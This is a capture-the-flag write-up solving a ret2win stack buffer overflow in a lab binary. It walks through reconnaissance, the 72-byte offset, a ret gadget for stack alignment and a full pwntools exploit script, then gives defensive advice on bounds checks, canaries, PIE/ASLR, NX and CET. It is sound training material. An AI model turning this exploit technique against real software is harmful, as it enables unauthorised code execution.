# Write-up (solution)
### Step-by-step Solution

1. Step 1 – Reconnaissance
```bash
file binary                  # 64-bit, NX off, no PIE, no canary
nm binary                    # reveals flag_function() at e.g. 0x401176
objdump -d ./binary | less   # Look at the i_have_something_vulnerable_here_function(). Will give something like "sub $0x40,%rsp"
```

**Findings**:

* x86-64 ELF
* No stack protector, no PIE → return addresses are predictable
* Hidden function: `0000000000401176 T flag_function`
* In `i_have_something_vulnerable_here_function`, you see:
```bash
sub    $0x40, %rsp     ; buffer size = 64 bytes
...
ret
```
Together with the saved base pointer (8 bytes), the total offset to RIP is: `64 + 8 = 72 bytes`:


2. Step 2 – First Attempt (and Crash)
We try the classic overflow:
```python
from pwn import *

io = process("./binary")
io.sendline(b"A"*72 + p64(0x401176))   # address of flag_function
print(io.recvall().decode())
```

Result: Segmentation fault.

Why? On x86-64, function calls expect the stack to be 16-byte aligned. Jumping straight to flag_function breaks this alignment, and the first libc call (fopen) crashes.

3. Step 3 - **Find a `ret` gadget**
We need a simple instruction to “realign” the stack. Look for a ret gadget:
```bash
objdump -d ./binary | grep 'c3'
# e.g., 0x40101a: ret 
```
This is a perfect gadget: it just executes ret, fixing the stack alignment before continuing into flag_function.

<details><summary>More info for step 3</summary>
Why Do You Need a `ret` Gadget?

On x86_64, functions expect the **stack to be 16-byte aligned**.  
When you overwrite the return address directly to `flag_function()`, the stack is misaligned, causing `fopen()` or `fgets()` to crash.

Fix: Add a `ret` gadget before `flag_function()` to realign the stack.
</details>


4. Step 4 - **Exploit script (pwntools)**

```python
from pwn import *

io = process("./binary")   # or remote("<host>", <port>)

OFFSET = 72
RET_GADGET = 0x40101a      # found with objdump
FLAG_FUNCTION = 0x401176   # from nm

payload = b"A" * OFFSET
payload += p64(RET_GADGET)
payload += p64(FLAG_FUNCTION)

io.sendline(payload)
print(io.recvall().decode())
```

```bash
# Run the exploit
python exploit.py
```

5. **Output**

```
Correct! Here is your flag:
flag{im_what_your_looking_for}
```

## Debrief: what you learn and how to protect against it

**What you learn:** the classic "ret2win". A function's return address is stored
on the stack after its local variables. Overflow the buffer far enough and you
decide where the program continues when the function returns, here in
`flag_function`, which is never called normally. You also learn the tools
(`file`, `nm`, `objdump`, pwntools) and why a 64-bit exploit sometimes needs an
extra `ret` to keep the stack aligned. (CTFd name `binary`; held back to release
during the event.)

**The solve in short:**

1. Recon: `nm binary` shows `flag_function` at `0x401176`; no PIE and no canary.
2. Find the distance to the return address: 64 bytes of buffer + 8 bytes of
   saved base pointer = 72.
3. Send 72 fillers followed by the address of `flag_function`. It crashes,
   because the stack is no longer 16-byte aligned.
4. Put the address of a single `ret` instruction in front to fix the alignment:
   `"A"*72 + p64(ret) + p64(flag_function)`.

**How to protect against it:**

- Fix the bug: `fgets(buf, sizeof(buf), stdin)` instead of a hard-coded 200.
- Keep the compiler's protections on. They are the default today and this
  challenge turns them off:
  - a stack canary (`-fstack-protector-strong`) detects the overwrite before the
    function returns,
  - PIE together with ASLR makes the address of `flag_function` different on
    every run,
  - a non-executable stack (NX) and a shadow stack (Intel CET, `-fcf-protection`)
    stop injected code and forged return addresses.
- These make exploitation much harder, but they are safety nets. A memory-safe
  language removes the bug class.
